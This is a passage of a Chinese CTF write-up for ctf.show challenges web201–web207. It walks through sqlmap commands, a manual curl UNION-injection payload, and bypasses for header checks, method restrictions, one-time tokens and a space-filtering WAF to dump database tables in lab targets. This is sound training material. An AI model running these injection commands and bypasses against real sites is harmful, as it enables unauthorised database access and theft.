3) 列表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://3c54d2f8-f3ac-4482-bc23-7be9f3ecbf14.challenge.ctf.show/api/?id=1&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch -D ctfshow_web --tables</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 4) 列列 （没什么必要的一步，但规矩得立住）</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://3c54d2f8-f3ac-4482-bc23-7be9f3ecbf14.challenge.ctf.show/api/?id=1&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5) 拖表（flag 在 username=&#x27;flag&#x27; 这一行，靠工具绕过了应用层过滤）</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://3c54d2f8-f3ac-4482-bc23-7be9f3ecbf14.challenge.ctf.show/api/?id=1&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>探测 + 列库可一起（首次跑，<code>--flush-session</code> 保证从零开始）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;https://3c54d2f8-f3ac-4482-bc23-7be9f3ecbf14.challenge.ctf.show/api/?id=1&quot;</span> \</span><br><span class="line"> --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line"> --batch --flush-session --dbs --threads=1 --time-sec=3</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<h2 id="参数再次一览"><a href="#参数再次一览" class="headerlink" title="参数再次一览"></a>参数再次一览</h2><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-u &quot;url&quot;</code></td>
+<td>指定目标 GET 链接，测试 <code>id=1</code> 这个参数是否存在 SQL 注入</td>
+</tr>
+<tr>
+<td><code>--referer=&quot;https://ctf.show/&quot;</code></td>
+<td>带上 Referer 请求头，有些靶站会校验这个头，不带就拦截 &#x2F; 返回异常</td>
+</tr>
+<tr>
+<td><code>\</code></td>
+<td>Shell 换行转义符，拆成多行功能不变；行尾不能有空格</td>
+</tr>
+<tr>
+<td><code>--batch</code> &#x2F;&#x2F; 可省</td>
+<td>自动选择默认回答，不需要人工一路输入 y&#x2F;n，静默跑</td>
+</tr>
+<tr>
+<td><code>--flush-session</code>  &#x2F;&#x2F; 可省</td>
+<td><strong>清空之前保存的缓存会话</strong>，不读取上次扫描结果，从头重新检测</td>
+</tr>
+<tr>
+<td><code>--dbs</code>等</td>
+<td>注入成功后，<strong>枚举所有数据库名称</strong>（最常用枚举参数）</td>
+</tr>
+<tr>
+<td><code>--threads=1</code> &#x2F;&#x2F; 可省</td>
+<td>线程设为 1，单线程发包，CTF 靶场很多有限流，多线程容易被拦</td>
+</tr>
+<tr>
+<td><code>--time-sec=3</code> &#x2F;&#x2F; 可省</td>
+<td>如果触发时间盲注，每次 sleep 延时 3 秒（默认 5 秒，缩短一点提速）</td>
+</tr>
+</tbody></table>
+<h2 id="实际观察到的结果"><a href="#实际观察到的结果" class="headerlink" title="实际观察到的结果"></a>实际观察到的结果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 检测阶段一次打通三种：boolean-based blind / time-based blind (SLEEP) / UNION query (3 columns)</span><br><span class="line">- 后端：MySQL &gt;= 5.0.12 (MariaDB fork)，PHP 7.3.11 + Nginx 1.20.1</span><br><span class="line">- 库：ctfshow_web、information_schema、mysql、performance_schema、test</span><br><span class="line">- 表：ctfshow_user，21 行，第 21 行就是 flag</span><br><span class="line">- 结果落盘：ctfshow&#123;e849e931-38a3-4840-b3d2-888e55bc030e&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h1 id="Web202"><a href="#Web202" class="headerlink" title="Web202"></a>Web202</h1><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><ul>
+<li>使用<code>--data</code>调整<code>sqlmap</code>的请求方式</li>
+</ul>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>和上题的前端代码完全一样，光看页面<code>/JS</code> 判断不出来。都是 <code>url:&#39;api/?id=&#39;+id</code>。</p>
+<p>虽然参数是<code>GET</code>参数，但是就是要使用<code>data</code>来传参。因为服务端只接受<code>POST</code>，而且参数必须放在请求体里。</p>
+<table>
+<thead>
+<tr>
+<th>测试差异</th>
+<th>web201</th>
+<th>web202</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>页面 hint</td>
+<td><code>--user-agent / --referer</code></td>
+<td><code>--data</code></td>
+</tr>
+<tr>
+<td>GET + UA&#x2F;<code>Referer</code></td>
+<td>成功</td>
+<td>❌ 查询失败，<code>count</code>:恒为”20”</td>
+</tr>
+<tr>
+<td>POST body + UA&#x2F;<code>Referer</code></td>
+<td>（反正大概也能过，未测）</td>
+<td>成功</td>
+</tr>
+<tr>
+<td>结论</td>
+<td>GET 传参</td>
+<td>必须 POST，参数在 body</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><code>--data=&quot;id=1&quot;</code> 一条同时做了两件事：把请求方法改成 <code>POST</code>、把参数塞进 <code>body</code>。不加就是 <code>GET + query string</code>，会被拒。</p>
+</blockquote>
+<p>其实测试的时候从<code>sqlmap</code>返回的结果就可看出是<code>POST</code>。</p>
+<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1) 探测 + 列库（--data 让它走 POST）</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://64b55eed-02a1-4092-91f2-50e973187b5e.challenge.ctf.show/api/&quot;</span> \</span><br><span class="line">  --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch --flush-session --dbs --threads=1 --time-sec=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 列表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://64b55eed-02a1-4092-91f2-50e973187b5e.challenge.ctf.show/api/&quot;</span> \</span><br><span class="line">  --data=<span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch -D ctfshow_web --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 拖表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://64b55eed-02a1-4092-91f2-50e973187b5e.challenge.ctf.show/api/&quot;</span> \</span><br><span class="line">  --data=<span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>--flush-session</code>和<code>--threads=1 --time-sec=3</code>两个都可以删了，后面不再提示。</p>
+</blockquote>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><ul>
+<li>方法校验与上实例一致：POST + <code>body</code> 成功，GET 回 查询失败 <code>count:&quot;20&quot;</code></li>
+<li>注入类型：<code>boolean</code> &#x2F; <code>time-based</code> &#x2F; UNION（3 列）</li>
+<li>库表：<code>ctfshow_web.ctfshow_user</code>，第 21 行 <code>username=&#39;flag&#39;</code></li>
+<li>落盘：<code>ctfshow&#123;c7b8ab71-0914-423b-b8c4-f102ab164de2&#125;</code></li>
+</ul>
+<hr>
+<h1 id="Web203"><a href="#Web203" class="headerlink" title="Web203"></a>Web203</h1><h2 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h2><ul>
+<li>使用<code>--method</code> 调整<code>sqlmap</code>的请求方式</li>
+</ul>
+<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>还需要加上<code>--headers=&quot;Content-Type: text/plain&quot;</code> 不然<code>data</code>是以表单形式发送</p>
+<p>总体需满足4个条件：</p>
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>方法 PUT</td>
+<td>POST（任何 <code>Content-Type</code>）一律 查询失败 <code>count:&quot;20&quot;</code></td>
+</tr>
+<tr>
+<td>路径 <code>/api/index.php</code></td>
+<td><code>PUT /api/</code> 被 <code>nginx 405</code>，<code>/api</code> 是 301</td>
+</tr>
+<tr>
+<td><code>Content-Type: text/plain</code></td>
+<td>参数 id&#x3D;1 放请求体</td>
+</tr>
+<tr>
+<td>UA 含 <code>sqlmap</code>、<code>Referer</code> 含 <code>ctf.show</code></td>
+<td>和前两题相同</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>这题最容易卡住的是路径：<code>hint</code> 只说 <code>--method</code>，但方法对了之后 <code>/api/</code> 还是 <code>405</code>——因为 <code>/api/</code> 是目录，<code>nginx</code> 只允许 GET&#x2F;POST；直接打目录里的 <code>index.php</code> 才放行 PUT。</p>
+</blockquote>
+<h2 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;https://60f4fb66-c984-4dc0-a1bc-f6b74e632900.challenge.ctf.show/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT \</span><br><span class="line">  --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch --flush-session --dbs --threads=1 --time-sec=3</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;https://60f4fb66-c984-4dc0-a1bc-f6b74e632900.challenge.ctf.show/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>--flush-session</code>可删，不然跑的时间太长了</p>
+</blockquote>
+<h2 id="结果与提示"><a href="#结果与提示" class="headerlink" title="结果与提示"></a>结果与提示</h2><ul>
+<li><code>sqlmap</code> 输出：<code>Parameter</code>: <code>id</code> (PUT)，三种类型全通（<code>boolean</code> &#x2F; <code>time</code> &#x2F; UNION 3 列）</li>
+<li>不加 <code>--headers</code> 的话，<code>sqlmap</code> 会自动给 <code>--data</code> 加表单 <code>Content-Type</code>，必须显式覆盖</li>
+<li>405 的响应体里是 <code>nginx/1.16.1</code>（容器内层），正常响应是 <code>nginx/1.20.1</code>（外层），可据此判断是 <code>nginx</code> 拦的，不是 WAF</li>
+<li>落盘：<code>ctfshow&#123;9696c911-9ea7-4be6-8cdf-f43ca196bae8&#125;</code></li>
+</ul>
+<hr>
+<h1 id="Web204"><a href="#Web204" class="headerlink" title="Web204"></a>Web204</h1><h2 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h2><ul>
+<li>使用<code>--cookie</code>提交<code>cookie</code>数据</li>
+</ul>
+<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>这题的<code>Cookie</code>是一个“对”，不是一个值，<code>ctfshow</code> 的 <code>token</code> 绑定 <code>PHPSESSID</code>，所以不能只复制 <code>token</code>。另外它是从 <code>/sqlmap.php</code> 下发的，不是 <code>/api/</code>。</p>
+<blockquote>
+<p><code>/sqlmap.php</code> 响应里下发两个 <code>Cookie</code>：<br><code>Set-Cookie: PHPSESSID=qls9s860pj55bmdnkqomq9qce2</code><br><code>Set-Cookie: ctfshow=a75d2e18d782042eb5151d5ed1549a12</code></p>
+</blockquote>
+<p>定位方式：</p>
+<table>
+<thead>
+<tr>
+<th>请求</th>
+<th>响应</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>不带 <code>Cookie</code></td>
+<td>查询失败，count:”20”</td>
+</tr>
+<tr>
+<td>只带 <code>ctfshow</code></td>
+<td>[“<code>token</code>验证失败”]</td>
+</tr>
+<tr>
+<td><code>PHPSESSID</code> + <code>ctfshow</code> 一起</td>
+<td>✅ 成功</td>
+</tr>
+</tbody></table>
+<h2 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h2><p>需要先测试功能点，然后取出响应里下发的两个<code>Cookie</code></p>
+<blockquote>
+<p><code>ctfshow：a0bd41c5bb092ad44a7e2caaf8e0ecc5</code><br><code>PHPSESSID：o5c9rrg7afj2v94am4gqqoshg6</code></p>
+</blockquote>
+<p>纯手工取值（Kali）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1) 取一套 cookie</span></span><br><span class="line">curl -skS -c /tmp/cj -o /dev/null \</span><br><span class="line">  -A <span class="string">&quot;sqlmap/1.10.10#stable (https://sqlmap.org)&quot;</span> \</span><br><span class="line">  -e <span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  <span class="string">&quot;https://e7323255-cab7-4b3c-8cad-e9fdfc020efe.challenge.ctf.show/sqlmap.php&quot;</span></span><br><span class="line"></span><br><span class="line">SID=$(awk <span class="string">&#x27;$6==&quot;PHPSESSID&quot;&#123;print $7&#125;&#x27;</span> /tmp/cj)</span><br><span class="line">TOK=$(awk <span class="string">&#x27;$6==&quot;ctfshow&quot;&#123;print $7&#125;&#x27;</span> /tmp/cj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 探测 + 列库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://e7323255-cab7-4b3c-8cad-e9fdfc020efe.challenge.ctf.show/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --cookie=<span class="string">&quot;PHPSESSID=<span class="variable">$SID</span>; ctfshow=<span class="variable">$TOK</span>&quot;</span> \</span><br><span class="line">  --batch --flush-session --dbs --threads=1 --time-sec=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 拖表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://e7323255-cab7-4b3c-8cad-e9fdfc020efe.challenge.ctf.show/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --cookie=<span class="string">&quot;PHPSESSID=<span class="variable">$SID</span>; ctfshow=<span class="variable">$TOK</span>&quot;</span> \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure>
+
+<p>自己取值：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;https://e7323255-cab7-4b3c-8cad-e9fdfc020efe.challenge.ctf.show/api/index.php&quot;</span> \</span><br><span class="line">   --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">   --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">   --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">   --cookie=<span class="string">&quot;PHPSESSID=o5c9rrg7afj2v94am4gqqoshg6; ctfshow=a0bd41c5bb092ad44a7e2caaf8e0ecc5&quot;</span> \</span><br><span class="line">   --batch -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h2><table>
+<thead>
+<tr>
+<th>题号</th>
+<th>新增条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web201</td>
+<td>UA 含 <code>sqlmap</code>、<code>Referer</code> 含 <code>ctf.show</code></td>
+</tr>
+<tr>
+<td>web202</td>
+<td>POST + 参数进 body</td>
+</tr>
+<tr>
+<td>web203</td>
+<td>PUT + <code>Content-Type: text/plain</code> + 访问 <code>/api/index.php</code></td>
+</tr>
+<tr>
+<td>web204</td>
+<td><code>+ PHPSESSID</code> 与 <code>ctfshow</code> 两个 <code>Cookie</code></td>
+</tr>
+</tbody></table>
+<p><code>ctfshow&#123;ecc37e14-0389-4d91-a80e-cab4084e3b28&#125;</code></p>
+<hr>
+<h1 id="Web205"><a href="#Web205" class="headerlink" title="Web205"></a>Web205</h1><h2 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>api</code>调用需要鉴权</li>
+</ul>
+<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>鉴权机制：一次性 <code>token</code>：</p>
+<ul>
+<li>页面 JS 在提交前会先 AJAX 请求 <code>api/getToken.php</code>（注意是 <code>.php</code>，不是 <code>api/getToken</code>）</li>
+<li>该接口只回 <code>Set-Cookie</code>: <code>PHPSESSID=...</code>，<code>token</code> 存在服务端会话里，用一次就失效</li>
+<li>所以 <code>sqlmap</code> 每条测试请求前都得重新换票 → <code>--safe-url</code> + <code>--safe-freq=1</code></li>
+</ul>
+<p>所以这里需要分清两种失败响应：</p>
+<table>
+<thead>
+<tr>
+<th>响应</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>api</code>鉴权失败，<code>count:&quot;1&quot;</code>，<code>data&quot;:[[]]</code></td>
+<td>没票 &#x2F; 票已被用掉</td>
+</tr>
+<tr>
+<td>查询失败，<code>count:&quot;21&quot;</code>，<code>data&quot;:[]</code></td>
+<td>鉴权过了，查询没过</td>
+</tr>
+<tr>
+<td>查询成功，<code>count:1</code></td>
+<td>正常</td>
+</tr>
+</tbody></table>
+<h2 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://b0a22e3b-48f8-409a-a89d-634b1c30265c.challenge.ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --batch --flush-session --dbs --threads=1 --time-sec=3</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --batch -D ctfshow_web --tables</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_flax --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><ul>
+<li><code>flag</code> 不在 <code>ctfshow_user</code>。库里有 <code>ctfshow_user</code> 和 <code>ctfshow_flax</code> 两张表，<code>flag</code> 在后者：<code>ctfshow_flax.flagx</code></li>
+<li><code>--safe-freq=1</code> 等于每发一个 <code>payload</code> 前都换一次票，请求量翻倍；网络慢时把 <code>--timeout</code> 调大一点</li>
+<li>手工验证时的顺序必须是“换票 → 立刻发一个请求”，中间插任何请求都会把票用掉</li>
+<li>手工 curl 的对应写法：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -skS -c /tmp/cj -o /dev/null -A <span class="string">&quot;sqlmap/1.10.10#stable (https://sqlmap.org)&quot;</span> \</span><br><span class="line">  -e <span class="string">&quot;https://ctf.show/&quot;</span> <span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span></span><br><span class="line">curl -skS -A <span class="string">&quot;sqlmap/1.10.10#stable (https://sqlmap.org)&quot;</span> -e <span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  -b /tmp/cj -X PUT -H <span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --data-binary <span class="string">&quot;id=0&#x27; union all select 1,flagx,3 from ctfshow_flax-- -&quot;</span> \</span><br><span class="line">  <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ctfshow&#123;2e527bf6-edb6-4a01-af99-2fb6bc1dc322&#125;</code></p>
+<hr>
+<h1 id="Web206"><a href="#Web206" class="headerlink" title="Web206"></a>Web206</h1><h2 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>sql</code>需要闭合</li>
+</ul>
+<h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>后端源码： <code>select id,username,pass from ctfshow_user where id = (&#39;$id&#39;) limit 0,1;</code></p>
+<p>参数被包在 <code>(&#39;…&#39;)</code> 里，后面还有 <code>limit 0,1</code>。所以 <code>payload</code> 必须同时做两件事：</p>
+<ul>
+<li>用 <code>&#39;)</code> 关掉引号和括号</li>
+<li>用注释吃掉后面的 <code>) limit 0,1</code></li>
+</ul>
+<p><strong>上面两个条件，<code>sqlmap</code>会帮我们测试，和<code>web205</code>一样便可以</strong></p>
+<blockquote>
+<p><code>&#39;)</code> 前缀和 <code>-- -</code> 后缀都是 <code>sqlmap</code> 的 <code>boundary</code> 检测自动试出来的，命令里没写 <code>--prefix/--suffix</code>。这题还继承了 <code>web205</code> 的鉴权，所以 <code>--safe-url</code> 照旧。</p>
+</blockquote>
+<h2 id="测试-5"><a href="#测试-5" class="headerlink" title="测试"></a>测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://a4931afa-f0e3-4e52-91c4-0d1e907c1212.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_flaxc --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h2><ul>
+<li><code>flag</code> 在 <code>ctfshow_flaxc.flagv</code>（<code>web205</code> 是 <code>ctfshow_flax.flagx</code>，每题的隐藏表名都在变）</li>
+<li>如果自动边界检测失败，再手工补：<code>--prefix=&quot;&#39;)&quot; --suffix=&quot;-- -&quot;</code>；这题的自动检测是成功的</li>
+<li>鉴权仍是一次性 token，命令里别漏 <code>--safe-url</code> + <code>--safe-freq=1</code></li>
+<li>手工验证顺序仍是 “换票 → 立刻发一个 PUT”</li>
+</ul>
+<p><code>ctfshow&#123;2a785f7c-4ad2-4487-b486-6c41fac30924&#125;</code></p>
+<hr>
+<h1 id="Web207"><a href="#Web207" class="headerlink" title="Web207"></a>Web207</h1><h2 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h2><ul>
+<li><code>--tamper</code> 的初体验</li>
+</ul>
+<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><h3 id="tamper参数："><a href="#tamper参数：" class="headerlink" title="tamper参数："></a>tamper参数：</h3><p><code>--tamper=TAMPER Use given script(s) for tampering injection data</code></p>
+<p>运行已经写好的<code>python</code>脚本，我们应该也可以自己自定义一些脚本。脚本介绍可查资料。</p>
+<h3 id="WAF与绕过"><a href="#WAF与绕过" class="headerlink" title="WAF与绕过"></a>WAF与绕过</h3><p>后端源码：<code>function waf($str)&#123; return preg_match(&#39;/ /&#39;, $str); &#125;</code></p>
+<p>拦的是任意位置的空格。闭合和鉴权沿用 web206，所以难点在“无空格写法”：</p>
+<ul>
+<li>中间空格 → &#x2F;**&#x2F;</li>
+<li>尾部注释 → #（# 不需要后面跟空格，而 –  会带一个空格被拦）</li>
+</ul>
+<h2 id="测试-6"><a href="#测试-6" class="headerlink" title="测试"></a>测试</h2><p>对空格过滤，考虑用<code>space2comment.py</code>这个脚本，将空格转换成注释符来绕过。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">B=<span class="string">&quot;https://83e5c26e-6c85-481a-a82a-8d574d9a369f.challenge.ctf.show&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$B</span>/api/index.php&quot;</span> \</span><br><span class="line">  --method=PUT --data=<span class="string">&quot;id=1&quot;</span> \</span><br><span class="line">  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --safe-url=<span class="string">&quot;<span class="variable">$B</span>/api/getToken.php&quot;</span> --safe-freq=1 \</span><br><span class="line">  --tamper=space2comment \</span><br><span class="line">  --batch -D ctfshow_web -T ctfshow_flaxca --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h2><ul>
+<li><code>space2comment</code>把空格替换成<code>/**/</code>，<code>sqlmap</code> 还自动把尾部注释选成了<code>#</code>：检测出的<code>UNIONpayload</code>就是这个形式</li>
+<li>有个容易误解的提示：<code>changes made by tampering scripts are not included in shown payload content(s)</code>——它显示的 <code>payload</code> 是替换前的，不要照抄去手工发</li>
+<li><code>flag</code> 在 <code>ctfshow_flaxca.flagvc</code>（表名&#x2F;字段名每题都在变）</li>
+<li>鉴权仍是一次性 <code>token</code> + PUT，<code>--safe-url/--safe-freq=1</code> 不能漏</li>
+</ul>
+<p><code>ctfshow&#123;8f604e0c-fee6-4613-8f35-5adf7be57419&#125;</code></p>
+<hr>
